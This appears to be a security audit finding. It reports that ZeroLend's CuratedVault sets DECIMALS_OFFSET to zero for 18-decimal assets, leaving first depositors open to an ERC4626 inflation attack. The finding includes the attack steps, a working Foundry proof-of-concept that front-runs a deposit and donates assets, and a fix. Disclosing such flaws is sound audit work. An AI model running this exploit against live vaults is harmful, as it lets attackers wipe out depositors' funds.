Careful Fleece Pike

Medium

# `CuratedVault` is vulnerable to an inflation attack when 18 decimals token is used as an asset

### Summary

`CuratedVault`'s `DECIMALS_OFFSET` is set to zero when 18 decimals token is used as an asset will cause the vault to be vulnerable to an inflation attack.

### Root Cause

ERC4626's decimals offset is a mitigation for inflation attack, but when it is set to zero, a griefing inflation attack still possible.

`CuratedVault`'s `DECIMALS_OFFSET` is set to zero when 18 decimals token is used as an asset

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L76

```solidity
  function initialize(
    address[] memory _admins,
    address[] memory _curators,
    address[] memory _guardians,
    address[] memory _allocators,
    uint256 _initialTimelock,
    address _asset,
    string memory _name,
    string memory _symbol
  ) external initializer {
    __ERC20_init(_name, _symbol);
    __ERC20Permit_init(_name);
    __ERC4626_init(IERC20Upgradeable(_asset));
    __Multicall_init();
    __CuratedVaultRoles_init(_admins, _curators, _guardians, _allocators);

>>  DECIMALS_OFFSET = uint8(uint256(18).zeroFloorSub(IERC20Metadata(_asset).decimals()));
    _checkTimelockBounds(_initialTimelock);
    _setTimelock(_initialTimelock);

    positionId = keccak256(abi.encodePacked(address(this), 'index', uint256(0)));
  }
```

### Internal pre-conditions

18 decimals token is used as an asset in the vault.

### External pre-conditions

_No response_

### Attack Path

1. The first depositor deposits `X` assets to the vault
2. The attacker front-run deposits `1` assets to the vault, and donates `2*X - 1` assets to the vault.

As a result, the first depositor loses `X` assets.

### Impact

- The first depositor loses `X` assets
- The attacker loses `1/2*X` assets

This attack is a griefing attack, but the loss of the user is greater than the loss of the attacker.

### PoC
Run command: `forge test --match-path test/PoC/PoC.t.sol -vv`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from 'lib/forge-std/src/Test.sol';
import '../forge/core/vaults/helpers/IntegrationVaultTest.sol';

contract PoC is IntegrationVaultTest {
  address alice = makeAddr('alice');
  address attacker = makeAddr('attacker');

  uint256 attackerBalanceBefore = 10 ether;
  uint256 depositAmount = 1 ether;

  function setUp() public {
    _setUpVault();
    _setCap(allMarkets[0], CAP);

    vm.prank(alice);
    loanToken.approve(address(vault), type(uint256).max);
    
    vm.startPrank(attacker);
    loanToken.approve(address(vault), type(uint256).max);
    loanToken.approve(address(allMarkets[0]), type(uint256).max);
    vm.stopPrank();

    loanToken.mint(alice, depositAmount);
    loanToken.mint(attacker, attackerBalanceBefore);
  }

  function testPoC() public {
    vm.startPrank(attacker);
    vault.deposit(1, attacker);
    allMarkets[0].supplySimple(address(loanToken), address(vault), 2 * depositAmount - 1, 0);
    allMarkets[0].forceUpdateReserve(address(loanToken));
    vm.stopPrank();

    vm.prank(alice);
    console.log("Alice's shares: %e", vault.deposit(depositAmount, alice));

    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    console.log("Attacker's loss: %e", attackerBalanceBefore - loanToken.balanceOf(attacker));
  }
}
```

Logs:
```bash
  Alice's shares: 0e0
  Attacker's loss: 5e17
```

### Mitigation

Hardcode the `DECIMALS_OFFSET`

```diff
  function initialize(
    address[] memory _admins,
    address[] memory _curators,
    address[] memory _guardians,
    address[] memory _allocators,
    uint256 _initialTimelock,
    address _asset,
    string memory _name,
    string memory _symbol
  ) external initializer {
    __ERC20_init(_name, _symbol);
    __ERC20Permit_init(_name);
    __ERC4626_init(IERC20Upgradeable(_asset));
    __Multicall_init();
    __CuratedVaultRoles_init(_admins, _curators, _guardians, _allocators);

-   DECIMALS_OFFSET = uint8(uint256(18).zeroFloorSub(IERC20Metadata(_asset).decimals()));
+   DECIMALS_OFFSET = 6;
    _checkTimelockBounds(_initialTimelock);
    _setTimelock(_initialTimelock);

    positionId = keccak256(abi.encodePacked(address(this), 'index', uint256(0)));
  }
```